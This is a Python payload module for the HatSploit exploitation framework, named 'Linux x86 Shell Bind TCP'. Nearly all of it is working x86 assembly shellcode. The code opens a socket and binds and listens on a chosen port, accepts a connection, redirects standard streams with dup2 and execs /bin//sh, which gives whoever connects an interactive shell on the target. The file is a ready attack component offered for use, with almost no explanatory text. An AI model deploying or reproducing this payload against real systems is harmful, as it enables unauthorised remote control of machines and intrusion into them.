"""
This payload requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.core.payload.basic import *
from hatsploit.lib.core.payload.linux import Linux


class HatSploitPayload(Payload, Handler, Linux):
    def __init__(self):
        super().__init__({
            'Name': "Linux x86 Shell Bind TCP",
            'Payload': "linux/x86/shell_bind_tcp",
            'Authors': [
                "Ivan Nikolskiy (enty8080) - payload developer",
            ],
            'Description': """
                This payload creates an interactive bind TCP shell for Linux
                with x86 architecture.
            """,
            'Arch': ARCH_X86,
            'Platform': OS_LINUX,
            'Type': BIND_TCP,
        })

    def implant(self):
        return self.__asm__(
            """
                push edi
                pop ebx
                push 0x2
                pop ecx

            dup:
                dec ecx
                push 0x3f
                pop eax
                int 0x80

                jns dup
                push 0x68732f2f
                push 0x6e69622f
                mov ebx, esp
                push eax
                push ebx
                mov ecx, esp
                mov al, 0xb
                int 0x80
            """
        )

    def run(self):
        return self.__asm__(
            f"""
            start:
                xor ebx, ebx
                mul ebx
                push ebx
                inc ebx
                push ebx
                push 0x2
                mov ecx, esp
                mov al, 0x66
                int 0x80

                pop ebx
                pop esi
                push edx
                push 0x{self.rport.little.hex()}0002
                push 0x10
                push ecx
                push eax
                mov ecx, esp
                push 0x66
                pop eax
                int 0x80

                mov dword ptr [ecx + 4], eax
                mov bl, 0x4
                mov al, 0x66
                int 0x80

                inc ebx
                mov al, 0x66
                int 0x80

                xchg ebx, eax
                pop ecx

            dup:
                dec ecx
                push 0x3f
                pop eax
                int 0x80

                jns dup
                push 0x68732f2f
                push 0x6e69622f
                mov ebx, esp
                push eax
                push ebx
                mov ecx, esp
                mov al, 0xb
                int 0x80
            """
        )
